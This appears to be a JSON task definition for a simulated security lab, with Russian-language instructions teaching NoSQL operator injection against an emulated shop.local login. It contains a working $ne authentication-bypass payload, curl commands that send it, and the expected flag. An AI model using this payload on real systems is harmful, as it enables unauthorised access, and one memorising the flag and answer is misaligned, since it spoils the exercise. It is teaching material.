@@ -1,0 +1,38 @@
+{
+  "id": "web-nosql-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{n0sql_0p3r4t0r_1nj3ct10n}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: NoSQL-инъекция\n\nЦель — `https://shop.local/api/login` (Node/Express + MongoDB). Вход принимает\nJSON `{\"user\":\"...\",\"pass\":\"...\"}` и передаёт объект прямо в `findOne`.\nЕсли вместо строки прислать **оператор** MongoDB, условие станет истинным.\n\n1. Обычный (неверный) вход: `curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' -d '{\"user\":\"admin\",\"pass\":\"wrong\"}'`.\n2. Подставь оператор `$ne` (не равно) вместо пароля — заготовка в `nosql.json`:\n   `{\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}`\n3. Отправь её и забери флаг:\n   `curl -s -X POST https://shop.local/api/login -H 'Content-Type: application/json' -d @nosql.json | grep 'nto{' > found.txt`\n4. Набери `check`.\n"
+    },
+    {
+      "path": "/home/student/task/nosql.json",
+      "text": "{\"user\":\"admin\",\"pass\":{\"$ne\":\"x\"}}"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        {
+          "match": "@nosql\\.json|u0024ne|%24ne|\\$ne",
+          "example": "-s -X POST https://shop.local/api/login -H 'Content-Type: application/json' -d @nosql.json",
+          "output": "{\"ok\":true,\"user\":\"admin\",\"role\":\"admin\",\"token\":\"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.sig\",\"flag\":\"nto{n0sql_0p3r4t0r_1nj3ct10n}\"}\n"
+        },
+        {
+          "match": "api/login",
+          "example": "-s -X POST https://shop.local/api/login -H 'Content-Type: application/json' -d '{\"user\":\"admin\",\"pass\":\"wrong\"}'",
+          "output": "{\"ok\":false,\"error\":\"invalid credentials\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только POST /api/login на shop.local.\n"
+    }
+  }
+}
